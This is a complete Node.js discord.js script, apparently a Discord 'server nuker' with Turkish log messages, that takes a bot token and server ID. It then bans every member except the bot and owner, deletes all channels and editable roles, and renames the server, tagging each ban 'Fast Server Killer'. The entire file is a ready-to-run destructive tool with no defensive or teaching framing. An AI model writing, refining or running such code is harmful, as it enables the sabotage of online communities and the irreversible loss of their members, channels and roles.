const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildEmojisAndStickers,
        GatewayIntentBits.GuildIntegrations,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.GuildMessageTyping,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildScheduledEvents,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.DirectMessageTyping,
        GatewayIntentBits.DirectMessageReactions,
        GatewayIntentBits.MessageContent
    ]
});
    
const rl = require('readline-sync');
/////////////////////////////
let token = rl.question('Token: ');
let server = rl.question('Server ID: ');
let ban_reason = rl.question('Ban Reason: ');
let server_name = rl.question('Server Name: ');
let eminmisiniz = rl.question('Emin misiniz? (E/H): ');
if(eminmisiniz.toLowerCase() != 'e') {
    console.log('İşlem iptal edildi!');
    return process.exit();
}
/////////////////////////////
client.on('ready', () => {
    console.log('Bot Aktif!');

    client.guilds.cache.get(server).members.cache.forEach(member => {
        try {
            console.log(`${member.user.tag} adlı kullanıcı sunucudan atıldı!`);
            if(member.id === client.user.id) return;
            if(member.id === client.guilds.cache.get(server).ownerId) return;
            member.ban({ reason: `${ban_reason} - Fast Server Killer` });
        } catch (e) {
            console.log(`${member.user.tag} adlı kullanıcı sunucudan atılamadı!`);
        }
    });
    
    client.guilds.cache.get(server).channels.cache.forEach(channel => {
        try {
            console.log(`${channel.name} adlı kanal silindi!`);
            channel.delete();
        } catch (e) {
            console.log(`${channel.name} adlı kanal silinemedi!`);
        }
    });

    client.guilds.cache.get(server).roles.cache.forEach(role => {
        try {
            if(!role.name) return;
            if(role.id === client.guilds.cache.get(server).id) return;
            if(!role.editable) return;
            console.log(`${role.name} adlı rol silindi!`);
            role.delete();
        } catch (e) {
            console.log(`${role.name} adlı rol silinemedi!`);
        }
    });

    try {
        client.guilds.cache.get(server).setName(server_name);
    } catch (e) {
        console.log('Sunucu ismi değiştirilemedi!');
    }
});
/////////////////////////////
client.login(token).catch(err => { console.log('Invalid Token'); process.exit(); });